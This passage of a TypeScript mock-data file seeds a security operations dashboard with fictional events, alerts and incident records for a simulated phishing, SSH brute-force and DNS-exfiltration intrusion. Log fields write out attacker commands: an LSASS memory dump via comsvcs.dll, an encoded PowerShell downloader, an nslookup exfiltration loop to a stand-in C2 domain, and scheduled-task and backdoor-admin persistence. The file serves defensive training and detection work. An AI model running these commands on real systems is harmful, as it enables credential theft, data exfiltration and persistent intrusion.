import { 
  SOCEvent, 
  SOCAlert, 
  SOCIncident, 
  IOCItem, 
  MitreTechnique, 
  NetworkFlow, 
  AuthRecord, 
  DetectionRule, 
  Asset, 
  AttackScenario, 
  SOCReport13Section, 
  AnalystNote 
} from '../types/soc';

// ==========================================
// 1. REALISTIC SOC SECURITY EVENTS TELEMETRY
// ==========================================
export const INITIAL_EVENTS: SOCEvent[] = [
  {
    id: 'EVT-9041',
    timestamp: '2026-08-26 19:50:12 UTC',
    severity: 'CRITICAL',
    event_type: 'Suspicious PowerShell Encoded Execution',
    category: 'ENDPOINT',
    source_ip: '192.168.10.45',
    dest_ip: '185.220.101.44',
    source_port: 49812,
    dest_port: 443,
    protocol: 'HTTPS',
    username: 'jdoe',
    host: 'WIN-CLIENT-08',
    detection_rule: 'RULE-002: Obfuscated PowerShell Command',
    rule_id: 'RULE-002',
    status: 'NEW',
    message: 'Process powershell.exe spawned with Base64 encoded payload and execution bypass flags by winword.exe',
    raw_log: '{"EventID": 1, "Provider": "Microsoft-Windows-Sysmon", "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...", "ParentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\Office16\\\\winword.exe", "User": "CORP\\\\jdoe", "ProcessId": 8944, "Hashes": "SHA256=9b71d224bd62f3785d96d46ad3ea3d733107e8d58ae477366bfd169d9f58f407"}',
    process_name: 'powershell.exe',
    command_line: 'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...',
    parent_process: 'winword.exe',
    file_hash: '9b71d224bd62f3785d96d46ad3ea3d733107e8d58ae477366bfd169d9f58f407',
    domain: 'update-cdn-cloudsvc.com',
    mitre_technique_id: 'T1059.001',
    action: 'ALERT'
  },
  {
    id: 'EVT-9040',
    timestamp: '2026-08-26 19:49:45 UTC',
    severity: 'HIGH',
    event_type: 'Outbound C2 Beaconing Detected',
    category: 'NETWORK',
    source_ip: '192.168.10.45',
    dest_ip: '185.220.101.44',
    source_port: 49812,
    dest_port: 443,
    protocol: 'HTTPS',
    username: 'jdoe',
    host: 'WIN-CLIENT-08',
    detection_rule: 'RULE-009: Outbound Cobalt Strike Beaconing Profile',
    rule_id: 'RULE-009',
    status: 'NEW',
    message: 'Periodic heartbeat TLS connections with jitter=15% to known Tor/Malignant ASN 49453',
    raw_log: '{"timestamp":"2026-08-26T19:49:45Z","flow_id":901844,"src_ip":"192.168.10.45","src_port":49812,"dest_ip":"185.220.101.44","dest_port":443,"proto":"TCP","app_proto":"tls","ja3":"771,49195-49199-49196-49200-52393-52392,0-10-11-13-35-23-65281,29-23-24,0","ja3_digest":"a0e9f5d64349fb13191bc781f81f42e1","bytes_out":1420,"bytes_in":890}',
    domain: 'update-cdn-cloudsvc.com',
    mitre_technique_id: 'T1071.001',
    bytes: 2310,
    action: 'ALERT'
  },
  {
    id: 'EVT-9039',
    timestamp: '2026-08-26 19:48:30 UTC',
    severity: 'CRITICAL',
    event_type: 'OS Credential Dumping via LSASS Handle Access',
    category: 'ENDPOINT',
    source_ip: '192.168.10.45',
    dest_ip: '192.168.10.45',
    protocol: 'PROCESS',
    username: 'SYSTEM',
    host: 'WIN-CLIENT-08',
    detection_rule: 'RULE-003: LSASS Process Injection / Minidump Access',
    rule_id: 'RULE-003',
    status: 'TRIAGED',
    message: 'Process rundll32.exe requested PROCESS_VM_READ and PROCESS_QUERY_INFORMATION rights on lsass.exe',
    raw_log: '{"EventID": 10, "Provider": "Microsoft-Windows-Sysmon", "SourceImage": "C:\\\\Windows\\\\System32\\\\rundll32.exe", "TargetImage": "C:\\\\Windows\\\\System32\\\\lsass.exe", "GrantedAccess": "0x1410", "CallTrace": "C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9d4af|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2c81e|C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\comsvcs.dll+1a24"}',
    process_name: 'rundll32.exe comsvcs.dll, #24',
    command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp full',
    parent_process: 'powershell.exe',
    mitre_technique_id: 'T1003.001',
    action: 'ALERT'
  },
  {
    id: 'EVT-9038',
    timestamp: '2026-08-26 19:46:10 UTC',
    severity: 'CRITICAL',
    event_type: 'Multiple SSH Brute-Force Authentication Failures',
    category: 'AUTHENTICATION',
    source_ip: '203.0.113.195',
    dest_ip: '10.0.0.15',
    source_port: 54122,
    dest_port: 22,
    protocol: 'SSH',
    username: 'root',
    host: 'LINUX-SRV-02',
    detection_rule: 'RULE-001: SSH Brute Force Detection',
    rule_id: 'RULE-001',
    status: 'NEW',
    message: '24 consecutive SSH auth failures in 45 seconds targeting users: root, admin, ubuntu, deploy, test',
    raw_log: 'Aug 26 19:46:10 linux-srv-02 sshd[41982]: Failed password for invalid user root from 203.0.113.195 port 54122 ssh2',
    mitre_technique_id: 'T1110.001',
    action: 'FAILURE'
  },
  {
    id: 'EVT-9037',
    timestamp: '2026-08-26 19:46:58 UTC',
    severity: 'CRITICAL',
    event_type: 'Successful SSH Login After Brute Force',
    category: 'AUTHENTICATION',
    source_ip: '203.0.113.195',
    dest_ip: '10.0.0.15',
    source_port: 54180,
    dest_port: 22,
    protocol: 'SSH',
    username: 'deploy',
    host: 'LINUX-SRV-02',
    detection_rule: 'RULE-005: Successful Login Following Password Brute Force',
    rule_id: 'RULE-005',
    status: 'NEW',
    message: 'Successful password authentication for user deploy from 203.0.113.195 immediately following brute force cluster',
    raw_log: 'Aug 26 19:46:58 linux-srv-02 sshd[42010]: Accepted password for deploy from 203.0.113.195 port 54180 ssh2',
    mitre_technique_id: 'T1078.003',
    action: 'SUCCESS'
  },
  {
    id: 'EVT-9036',
    timestamp: '2026-08-26 19:45:00 UTC',
    severity: 'HIGH',
    event_type: 'Impossible Travel / Geolocation Anomaly',
    category: 'AUTHENTICATION',
    source_ip: '91.240.118.82',
    dest_ip: '10.0.0.50',
    protocol: 'HTTPS',
    username: 'sarah.connor@corp.cyber',
    host: 'AZURE-AD-AUTH',
    detection_rule: 'RULE-004: Impossible Travel Geolocation Anomaly',
    rule_id: 'RULE-004',
    status: 'TRIAGED',
    message: 'User authenticated from New York, USA at 19:30 UTC, then from Moscow, Russia at 19:45 UTC (Velocity: 18,400 km/h)',
    raw_log: '{"UserPrincipalName":"sarah.connor@corp.cyber","IPAddress":"91.240.118.82","Location":{"Country":"RU","City":"Moscow"},"PreviousLogin":{"IPAddress":"64.120.88.12","Location":{"Country":"US","City":"New York"},"Timestamp":"2026-08-26T19:30:10Z"}}',
    mitre_technique_id: 'T1078',
    action: 'ALERT'
  },
  {
    id: 'EVT-9035',
    timestamp: '2026-08-26 19:43:22 UTC',
    severity: 'HIGH',
    event_type: 'High-Frequency SYN Port Scan Detected',
    category: 'NETWORK',
    source_ip: '45.142.214.99',
    dest_ip: '10.0.0.10',
    protocol: 'TCP',
    username: 'N/A',
    host: 'WEB-SRV-01',
    detection_rule: 'RULE-007: TCP SYN Reconnaissance Sweep',
    rule_id: 'RULE-007',
    status: 'TRIAGED',
    message: 'Over 850 TCP SYN probes across ports 21-8080 from single IP in 10 seconds. TCP flags: SYN only (no ACK)',
    raw_log: '{"suricata":{"alert":{"action":"allowed","gid":1,"signature":"ET SCAN Potential NMAP OS Detection / SYN Sweep","signature_id":2000537,"rev":8,"category":"Attempted Information Leak","severity":2},"src_ip":"45.142.214.99","dest_ip":"10.0.0.10"}}',
    mitre_technique_id: 'T1046',
    action: 'ALERT'
  },
  {
    id: 'EVT-9034',
    timestamp: '2026-08-26 19:41:05 UTC',
    severity: 'CRITICAL',
    event_type: 'DNS Tunneling / Data Exfiltration Query Stream',
    category: 'DNS',
    source_ip: '192.168.10.88',
    dest_ip: '192.168.10.1',
    source_port: 58211,
    dest_port: 53,
    protocol: 'DNS',
    username: 'svc_backup',
    host: 'DB-SRV-01',
    detection_rule: 'RULE-006: High Entropy DNS Tunneling & Exfiltration',
    rule_id: 'RULE-006',
    status: 'NEW',
    message: 'High entropy subdomain queries (>65 chars) streaming to authoritative nameserver for c2-exfil-ns1.darknet.io',
    raw_log: '{"id.orig_h":"192.168.10.88","id.resp_h":"192.168.10.1","proto":"udp","service":"dns","query":"aW52b2ljZXNfcGF5cm9sbF8yMDI2.c2VjcmV0X2RhZGE.c2-exfil-ns1.darknet.io","qtype_name":"TXT","rcode_name":"NOERROR","entropy":4.82}',
    domain: 'c2-exfil-ns1.darknet.io',
    mitre_technique_id: 'T1071.004',
    action: 'ALERT'
  },
  {
    id: 'EVT-9033',
    timestamp: '2026-08-26 19:39:18 UTC',
    severity: 'HIGH',
    event_type: 'Suspicious Privilege Escalation via Sudoers',
    category: 'ENDPOINT',
    source_ip: '10.0.0.15',
    dest_ip: '10.0.0.15',
    protocol: 'SSH',
    username: 'deploy',
    host: 'LINUX-SRV-02',
    detection_rule: 'RULE-008: Unauthorized Sudoers Privilege Escalation',
    rule_id: 'RULE-008',
    status: 'TRIAGED',
    message: 'User deploy executed "sudo /bin/bash" after injecting ALL=(ALL) NOPASSWD into /etc/sudoers.d/99-deploy',
    raw_log: 'Aug 26 19:39:18 linux-srv-02 sudo:   deploy : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash',
    process_name: '/bin/bash',
    command_line: 'sudo /bin/bash',
    parent_process: 'sshd',
    mitre_technique_id: 'T1548.003',
    action: 'SUCCESS'
  },
  {
    id: 'EVT-9032',
    timestamp: '2026-08-26 19:38:00 UTC',
    severity: 'MEDIUM',
    event_type: 'Scheduled Task Persistence Created',
    category: 'ENDPOINT',
    source_ip: '192.168.10.45',
    dest_ip: '192.168.10.45',
    protocol: 'PROCESS',
    username: 'SYSTEM',
    host: 'WIN-CLIENT-08',
    detection_rule: 'RULE-010: Suspicious Scheduled Task Registration',
    rule_id: 'RULE-010',
    status: 'TRIAGED',
    message: 'New scheduled task "WindowsUpdateCheckDaily" registered to execute payload from C:\\Users\\Public\\updater.exe on logon',
    raw_log: '{"EventID": 4698, "Provider": "Microsoft-Windows-Security-Auditing", "TaskName": "\\\\WindowsUpdateCheckDaily", "TaskContent": "<Exec><Command>C:\\\\Users\\\\Public\\\\updater.exe</Command></Exec>", "SubjectUserName": "SYSTEM"}',
    process_name: 'schtasks.exe',
    command_line: 'schtasks /create /tn "WindowsUpdateCheckDaily" /tr "C:\\Users\\Public\\updater.exe" /sc onlogon /ru SYSTEM',
    mitre_technique_id: 'T1053.005',
    action: 'SUCCESS'
  },
  {
    id: 'EVT-9031',
    timestamp: '2026-08-26 19:35:40 UTC',
    severity: 'MEDIUM',
    event_type: 'Local Administrator Account Added',
    category: 'AUTHENTICATION',
    source_ip: '192.168.10.45',
    dest_ip: '192.168.10.45',
    protocol: 'ENDPOINT',
    username: 'SYSTEM',
    host: 'WIN-CLIENT-08',
    detection_rule: 'RULE-011: New Local Admin Group Member Added',
    rule_id: 'RULE-011',
    status: 'CLOSED',
    message: 'User account "backdoor_admin" was created and added to the Administrators security group',
    raw_log: '{"EventID": 4728, "Provider": "Microsoft-Windows-Security-Auditing", "MemberName": "CN=backdoor_admin,CN=Users,DC=corp,DC=cyber", "TargetUserName": "Administrators", "SubjectUserName": "SYSTEM"}',
    process_name: 'net.exe',
    command_line: 'net localgroup administrators backdoor_admin /add',
    mitre_technique_id: 'T1136.001',
    action: 'SUCCESS'
  },
  {
    id: 'EVT-9030',
    timestamp: '2026-08-26 19:32:15 UTC',
    severity: 'LOW',
    event_type: 'Successful Kerberos TGS Request (Kerberoasting)',
    category: 'AUTHENTICATION',
    source_ip: '192.168.10.22',
    dest_ip: '10.0.0.1',
    source_port: 52140,
    dest_port: 88,
    protocol: 'KERBEROS',
    username: 'mark.watney',
    host: 'DC-PROD-01',
    detection_rule: 'RULE-012: SPN Request with Weak RC4 Encryption (Kerberoast)',
    rule_id: 'RULE-012',
    status: 'ANALYZING',
    message: 'Kerberos service ticket requested for MSSQLSvc/sql-cluster.corp.cyber:1433 with RC4-HMAC encryption (Ticket Encryption: 0x17)',
    raw_log: '{"EventID": 4769, "Provider": "Microsoft-Windows-Security-Auditing", "ServiceName": "MSSQLSvc/sql-cluster.corp.cyber:1433", "TicketOptions": "0x40810000", "TicketEncryptionType": "0x17", "TargetUserName": "mark.watney@CORP.CYBER"}',
    mitre_technique_id: 'T1558.003',
    action: 'SUCCESS'
  },
  {
    id: 'EVT-9029',
    timestamp: '2026-08-26 19:30:00 UTC',
    severity: 'INFO',
    event_type: 'Normal HTTPS User Web Browsing',
    category: 'NETWORK',
    source_ip: '192.168.10.105',
    dest_ip: '142.250.190.46',
    source_port: 51230,
    dest_port: 443,
    protocol: 'HTTPS',
    username: 'alice.w',
    host: 'WIN-CLIENT-02',
    status: 'CLOSED',
    message: 'Outbound TLS 1.3 session to google.com verified clean by NextGen Firewall web filter',
    bytes: 48920,
    action: 'ALLOW'
  },
  {
    id: 'EVT-9028',
    timestamp: '2026-08-26 19:28:44 UTC',
    severity: 'INFO',
    event_type: 'Routine Windows Update Service Sync',
    category: 'ENDPOINT',
    source_ip: '10.0.0.10',
    dest_ip: '20.190.159.23',
    source_port: 53110,
    dest_port: 443,
    protocol: 'HTTPS',
    username: 'SYSTEM',
    host: 'WEB-SRV-01',
    status: 'CLOSED',
    message: 'Windows Update Agent checked in with Microsoft CDN; 0 security patches pending',
    bytes: 12400,
    action: 'ALLOW'
  }
];

// ==========================================
// 2. REALISTIC SOC ALERTS & DEEP INVESTIGATIONS
// ==========================================
export const INITIAL_ALERTS: SOCAlert[] = [
  {
    id: 'ALT-2026-8812',
    alert_id: 'ALT-2026-8812',
    timestamp: '2026-08-26 19:50:12 UTC',
    title: 'Obfuscated PowerShell Process Execution with C2 Callback',
    severity: 'CRITICAL',
    category: 'Endpoint EDR / Process Injection',
    detection_rule: 'RULE-002: Suspicious Encoded PowerShell Execution',
    rule_id: 'RULE-002',
    source_ip: '192.168.10.45',
    dest_ip: '185.220.101.44',
    source_port: 49812,
    dest_port: 443,
    protocol: 'HTTPS',
    username: 'jdoe',
    hostname: 'WIN-CLIENT-08',
    process: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    command_line: 'powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMAdAByAGkAbgBnACAAPQAgACQA...',
    parent_process: 'C:\\Program Files\\Microsoft Office\\Office16\\winword.exe',
    file_hash: '9b71d224bd62f3785d96d46ad3ea3d733107e8d58ae477366bfd169d9f58f407',
    domain: 'update-cdn-cloudsvc.com',
    url: 'https://update-cdn-cloudsvc.com/stage2.bin',
    status: 'INVESTIGATING',
    mitre_tactic: 'Execution / Command and Control',
    mitre_technique: 'Command and Scripting Interpreter: PowerShell',
    mitre_technique_id: 'T1059.001',
    risk_score: 95,
    why_suspicious: [
      'Microsoft Word (winword.exe) should NEVER spawn powershell.exe in standard enterprise desktop operations.',
      'Execution policy bypass flags (-nop -w hidden) indicate active attempt to evade user visual notification and GPO restrictions.',
      'Base64 encoded string decoded to an in-memory WebClient download of secondary executable stage2.bin directly into RAM.',
      'Destination IP 185.220.101.44 is a known Bulletproof Host / Tor Exit Node flagged on Threat Intel feeds.'
    ],
    recommended_actions: [
      '1. Isolate workstation WIN-CLIENT-08 immediately from corporate VLAN via EDR network containment.',
      '2. Block destination IP 185.220.101.44 and domain update-cdn-cloudsvc.com at perimeter firewall / proxy.',
      '3. Terminate running PowerShell and rundll32 process tree on WIN-CLIENT-08.',
      '4. Revoke Active Directory session tokens and force password reset for user jdoe.',
      '5. Acquire RAM memory dump and triage forensic artifacts (MFT, Prefetch, Sysmon logs).'
    ],
    timeline: [
      {
        step: 1,
        time_offset: '-15m',
        timestamp: '2026-08-26 19:35:10 UTC',
        title: 'Phishing Email Delivered',
        description: 'Email from external sender "payroll-update@secure-hr-portal.com" containing attachment "Q3_Bonus_Summary.docm" delivered to user jdoe.',
        evidence_type: 'AUTH',
        severity: 'LOW'
      },
      {
        step: 2,
        time_offset: '-10m',
        timestamp: '2026-08-26 19:40:02 UTC',
        title: 'Malicious Word Document Opened & VBA Macro Executed',
        description: 'User jdoe opened attachment and clicked "Enable Content", triggering AutoOpen() VBA macro.',
        evidence_type: 'FILE',
        severity: 'MEDIUM'
      },
      {
        step: 3,
        time_offset: '0s',
        timestamp: '2026-08-26 19:50:12 UTC',
        title: 'ALERT TRIGGER: Encoded PowerShell Spawned',
        description: 'winword.exe spawned hidden powershell.exe downloading stage2 payload from external C2 server.',
        evidence_type: 'PROCESS',
        severity: 'CRITICAL',
        is_trigger: true
      },
      {
        step: 4,
        time_offset: '+2m',
        timestamp: '2026-08-26 19:52:15 UTC',
        title: 'Memory Injection & LSASS Credential Dump',
        description: 'Process rundll32.exe comsvcs.dll invoked to dump LSASS process memory to C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.dmp.',
        evidence_type: 'PROCESS',
        severity: 'CRITICAL'
      },
      {
        step: 5,
        time_offset: '+5m',
        timestamp: '2026-08-26 19:55:00 UTC',
        title: 'C2 Beaconing Initiated',
        description: 'Encrypted HTTPS heartbeats established to 185.220.101.44 with regular 60s jittered intervals.',
        evidence_type: 'C2',
        severity: 'HIGH'
      }
    ],
    assigned_analyst: 'SOC L1 Analyst',
    related_event_ids: ['EVT-9041', 'EVT-9040', 'EVT-9039'],
    notes: 'Initial triage confirms true positive malicious macro-based dropper initiating Cobalt Strike C2 beacon.'
  },
  {
    id: 'ALT-2026-8813',
    alert_id: 'ALT-2026-8813',
    timestamp: '2026-08-26 19:46:58 UTC',
    title: 'SSH Brute Force Attack Leading to Unauthorized Shell Access',
    severity: 'CRITICAL',
    category: 'Network / Identity Compromise',
    detection_rule: 'RULE-005: Successful Login Following Password Brute Force',
    rule_id: 'RULE-005',
    source_ip: '203.0.113.195',
    dest_ip: '10.0.0.15',
    source_port: 54180,
    dest_port: 22,
    protocol: 'SSH',
    username: 'deploy',
    hostname: 'LINUX-SRV-02',
    process: '/usr/sbin/sshd',
    command_line: 'sshd: deploy [priv]',
    parent_process: 'systemd',
    file_hash: 'N/A (Network Auth)',
    domain: 'N/A',
    url: 'N/A',
    status: 'TRIAGED',
    mitre_tactic: 'Initial Access / Credential Access',
    mitre_technique: 'Brute Force: Password Guessing',
    mitre_technique_id: 'T1110.001',
    risk_score: 92,
    why_suspicious: [
      '24 consecutive SSH auth failures in 45 seconds targeting common service accounts (root, admin, deploy).',
      'Sudden authentication success for user "deploy" using weak legacy password.',
      'Attacker IP 203.0.113.195 is located in high-risk geographic ASN with no legitimate business relationship.',
      'Immediately upon login, an interactive bash shell spawned with sudo privilege escalation attempts.'
    ],
    recommended_actions: [
      '1. Block external IP 203.0.113.195 on perimeter firewall immediately.',
      '2. Kill active SSH sessions on LINUX-SRV-02 and lock deploy account (usermod -L deploy).',
      '3. Audit /home/deploy/.ssh/authorized_keys for persistent attacker public keys.',
      '4. Enforce SSH key-only authentication (PasswordAuthentication no in /etc/ssh/sshd_config).'
    ],
    timeline: [
      {
        step: 1,
        time_offset: '-2m',
        timestamp: '2026-08-26 19:45:00 UTC',
        title: 'High Volume SSH Probing',
        description: 'Automated brute force dictionary attack launched against port 22.',
        evidence_type: 'AUTH',
        severity: 'HIGH'
      },
      {
        step: 2,
        time_offset: '0s',
        timestamp: '2026-08-26 19:46:58 UTC',
        title: 'ALERT TRIGGER: Successful Password Auth',
        description: 'Password accepted for user deploy from attacker IP.',
        evidence_type: 'AUTH',
        severity: 'CRITICAL',
        is_trigger: true
      },
      {
        step: 3,
        time_offset: '+3m',
        timestamp: '2026-08-26 19:49:58 UTC',
        title: 'Sudoers Modification Attempt',
        description: 'Attacker attempted to write backdoor sudoers entry to achieve persistent root privilege.',
        evidence_type: 'PROCESS',
        severity: 'CRITICAL'
      }
    ],
    assigned_analyst: 'SOC L1 Analyst',
    related_event_ids: ['EVT-9038', 'EVT-9037', 'EVT-9033'],
    notes: 'Escalated to INC-2026-0042. Server network interface disabled while forensic triage is conducted.'
  },
  {
    id: 'ALT-2026-8814',
    alert_id: 'ALT-2026-8814',
    timestamp: '2026-08-26 19:41:05 UTC',
    title: 'High Entropy DNS Tunneling Data Exfiltration',
    severity: 'HIGH',
    category: 'Data Exfiltration / Covert Channel',
    detection_rule: 'RULE-006: High Entropy DNS Tunneling & Exfiltration',
    rule_id: 'RULE-006',
    source_ip: '192.168.10.88',
    dest_ip: '192.168.10.1',
    source_port: 58211,
    dest_port: 53,
    protocol: 'DNS',
    username: 'svc_backup',
    hostname: 'DB-SRV-01',
    process: 'C:\\Windows\\System32\\cmd.exe',
    command_line: 'nslookup -type=TXT %CHUNK%.c2-exfil-ns1.darknet.io',
    parent_process: 'sqlservr.exe',
    file_hash: '3f5187e1a3b8d4e92a0149c0d1283e5891acbe01235489f0716a4e32049b1c90',
    domain: 'c2-exfil-ns1.darknet.io',
    url: 'N/A',
    status: 'NEW',
    mitre_tactic: 'Exfiltration / Command and Control',
    mitre_technique: 'Application Layer Protocol: DNS Tunneling',
    mitre_technique_id: 'T1071.004',
    risk_score: 88,
    why_suspicious: [
      'Over 2,400 TXT record lookups generated within 3 minutes by internal database server DB-SRV-01.',
      'Subdomain labels exhibit Shannon Entropy > 4.8 with Base64/Hex encoding patterns.',
      'Domain c2-exfil-ns1.darknet.io registered only 48 hours ago via anonymized Russian registrar.',
      'SQL Server service process spawned cmd.exe via xp_cmdshell stored procedure.'
    ],
    recommended_actions: [
      '1. Block resolving domain *.darknet.io at internal DNS forwarders and sinkhole queries.',
      '2. Disable xp_cmdshell on DB-SRV-01 MS SQL instance immediately.',
      '3. Review SQL audit logs for unauthorized SQL injection queries against database tables.'
    ],
    timeline: [
      {
        step: 1,
        time_offset: '-5m',
        timestamp: '2026-08-26 19:36:00 UTC',
        title: 'SQL Injection on Web App',
        description: 'Web application received stacked SQL queries via vulnerable search endpoint.',
        evidence_type: 'NETWORK',
        severity: 'HIGH'
      },
      {
        step: 2,
        time_offset: '0s',
        timestamp: '2026-08-26 19:41:05 UTC',
        title: 'ALERT TRIGGER: DNS Exfiltration Burst',
        description: 'xp_cmdshell launched nslookup loop encoding customer records into DNS subdomains.',
        evidence_type: 'NETWORK',
        severity: 'HIGH',
        is_trigger: true
      }
    ],
    assigned_analyst: 'Unassigned',
    related_event_ids: ['EVT-9034']
  },
  {
    id: 'ALT-2026-8815',
    alert_id: 'ALT-2026-8815',
    timestamp: '2026-08-26 19:45:00 UTC',
    title: 'Impossible Geolocation Travel Authentication Detected',
    severity: 'HIGH',
    category: 'Identity / Account Takeover',
    detection_rule: 'RULE-004: Impossible Travel Geolocation Anomaly',
    rule_id: 'RULE-004',
    source_ip: '91.240.118.82',
    dest_ip: '10.0.0.50',
    source_port: 443,
    dest_port: 443,
    protocol: 'HTTPS',
    username: 'sarah.connor@corp.cyber',
    hostname: 'AZURE-AD-AUTH',
    process: 'cloud_identity_provider',
    command_line: 'N/A',
    parent_process: 'N/A',
    file_hash: 'N/A',
    domain: 'login.microsoftonline.com',
    url: 'N/A',
    status: 'TRIAGED',
    mitre_tactic: 'Defense Evasion / Initial Access',
    mitre_technique: 'Valid Accounts: Cloud Accounts',
    mitre_technique_id: 'T1078.004',
    risk_score: 84,
    why_suspicious: [
      'Account logged into Office 365 from New York, USA (IP: 64.120.88.12) at 19:30 UTC.',
      'Same account logged into VPN from Moscow, Russia (IP: 91.240.118.82) 15 minutes later.',
      'Physical travel speed required exceeds 18,000 km/h, impossible for commercial aviation.',
      'IP 91.240.118.82 is a known VPN/Proxy anonymizer.'
    ],
    recommended_actions: [
      '1. Trigger immediate MFA step-up verification and revoke all active OAuth refresh tokens.',
      '2. Contact user Sarah Connor via out-of-band channel to verify current physical location.',
      '3. Review Azure AD sign-in logs and mailbox forwarding rules for illicit mail rules.'
    ],
    timeline: [
      {
        step: 1,
        time_offset: '-15m',
        timestamp: '2026-08-26 19:30:10 UTC',
        title: 'Legitimate Sign-in from HQ',
        description: 'User logged in from corporate IP in New York.',
        evidence_type: 'AUTH',
        severity: 'INFO'
      },
      {
        step: 2,
        time_offset: '0s',
        timestamp: '2026-08-26 19:45:00 UTC',
        title: 'ALERT TRIGGER: Anomalous VPN Auth',
        description: 'Sign-in attempt succeeded from Moscow proxy IP.',
        evidence_type: 'AUTH',
        severity: 'HIGH',
        is_trigger: true
      }
    ],
    assigned_analyst: 'SOC L1 Analyst',
    related_event_ids: ['EVT-9036']
  },
  {
    id: 'ALT-2026-8816',
    alert_id: 'ALT-2026-8816',
    timestamp: '2026-08-26 19:43:22 UTC',
    title: 'Port Scanning Reconnaissance Sweep from External Host',
    severity: 'MEDIUM',
    category: 'Network Reconnaissance',
    detection_rule: 'RULE-007: TCP SYN Reconnaissance Sweep',
    rule_id: 'RULE-007',
    source_ip: '45.142.214.99',
    dest_ip: '10.0.0.10',
    source_port: 39481,
    dest_port: 80,
    protocol: 'TCP',
    username: 'N/A',
    hostname: 'WEB-SRV-01',
    process: 'N/A (Firewall Flow)',
    command_line: 'N/A',
    parent_process: 'N/A',
    file_hash: 'N/A',
    domain: 'N/A',
    url: 'N/A',
    status: 'TRIAGED',
    mitre_tactic: 'Discovery',
    mitre_technique: 'Network Service Scanning',
    mitre_technique_id: 'T1046',
    risk_score: 65,
    why_suspicious: [
      'Over 850 TCP SYN packets sent to sequential ports within 10 seconds.',
      'No TCP handshake completion (SYN-ACK followed by RST indicates Nmap stealth scan).',
      'Attacker targeting critical management ports 22, 3389, 445, 8080.'
    ],
    recommended_actions: [
      '1. Add IP 45.142.214.99 to edge firewall auto-drop blacklist for 24 hours.',
      '2. Verify that no administrative ports (SSH, RDP, SMB) are exposed to public WAN.'
    ],
    timeline: [
      {
        step: 1,
        time_offset: '0s',
        timestamp: '2026-08-26 19:43:22 UTC',
        title: 'ALERT TRIGGER: SYN Sweep Detected',
        description: 'Perimeter IDS triggered signature 2000537 on rapid port scan.',
        evidence_type: 'NETWORK',
        severity: 'MEDIUM',
        is_trigger: true
      }
    ],
    assigned_analyst: 'SOC L1 Analyst',
    related_event_ids: ['EVT-9035']
  }
];

// ==========================================
// 3. ENTERPRISE INCIDENT RESPONSE CASES (IR)
// ==========================================
export const INITIAL_INCIDENTS: SOCIncident[] = [
  {
    id: 'INC-2026-0041',
    incident_id: 'INC-2026-0041',
    title: 'Phishing-Initiated Cobalt Strike C2 & Credential Dumping on WIN-CLIENT-08',
    severity: 'CRITICAL',
    detection_time: '2026-08-26 19:50:12 UTC',
    affected_host: 'WIN-CLIENT-08',
    affected_user: 'jdoe (John Doe - Finance Dept)',
    source_ip: '185.220.101.44',
    current_status: 'INVESTIGATING',
    assigned_analyst: 'SOC L1 Analyst',
    summary: 'Macro-enabled malicious Word document delivered via spear-phishing triggered Base64 obfuscated PowerShell dropper, spawned LSASS minidump, and established encrypted C2 beaconing to bulletproof server in Netherlands.',
    related_alert_ids: ['ALT-2026-8812'],
    mitre_tactics: ['Initial Access', 'Execution', 'Defense Evasion', 'Credential Access', 'Command and Control'],
    mitre_techniques: ['T1566.001 (Spearphishing Attachment)', 'T1059.001 (PowerShell)', 'T1003.001 (LSASS Memory)', 'T1071.001 (Web Protocols)'],
    containment_actions_taken: [
      'EDR network isolation initiated on WIN-CLIENT-08',
      'Outbound firewall rule created blocking 185.220.101.44/32',
      'Active Directory user account jdoe disabled'
    ],
    containment_status: {
      host_isolated: true,
      ip_blocked: true,
      credentials_reset: false,
      process_killed: true
    },
    impact_scope: 'Single workstation compromised. User jdoe has finance share read privileges. No lateral movement observed to domain controllers yet.',
    root_cause: 'Email gateway failed to block macro-enabled .docm attachment; endpoint lacked Attack Surface Reduction (ASR) rule preventing Office apps from creating child processes.'
  },
  {
    id: 'INC-2026-0042',
    incident_id: 'INC-2026-0042',
    title: 'SSH Brute Force & Sudo Privilege Escalation on LINUX-SRV-02',
    severity: 'CRITICAL',
    detection_time: '2026-08-26 19:46:58 UTC',
    affected_host: 'LINUX-SRV-02',
    affected_user: 'deploy (Service Account)',
    source_ip: '203.0.113.195',
    current_status: 'CONTAINED',
    assigned_analyst: 'SOC Lead Analyst',
    summary: 'Automated SSH brute-force compromised service account deploy with weak static password. Attacker gained interactive terminal access and escalated privileges via sudoers misconfiguration.',
    related_alert_ids: ['ALT-2026-8813'],
    mitre_tactics: ['Initial Access', 'Credential Access', 'Privilege Escalation', 'Persistence'],
    mitre_techniques: ['T1110.001 (Password Guessing)', 'T1078.003 (Local Accounts)', 'T1548.003 (Sudo and Sudo Caching)'],
    containment_actions_taken: [
      'Blocked IP 203.0.113.195 on perimeter gateway',
      'Terminated active SSH session PID 42010',
      'Removed malicious sudoers entry /etc/sudoers.d/99-deploy'
    ],
    containment_status: {
      host_isolated: true,
      ip_blocked: true,
      credentials_reset: true,
      process_killed: true
    },
    impact_scope: 'Staging web server LINUX-SRV-02 compromised. Staging database credentials potentially accessed.',
    root_cause: 'SSH port 22 exposed directly to public internet without fail2ban or SSH key restriction; service account possessed excessive sudo privileges.'
  },
  {
    id: 'INC-2026-0043',
    incident_id: 'INC-2026-0043',
    title: 'SQLi Induced Covert DNS Exfiltration on DB-SRV-01',
    severity: 'HIGH',
    detection_time: '2026-08-26 19:41:05 UTC',
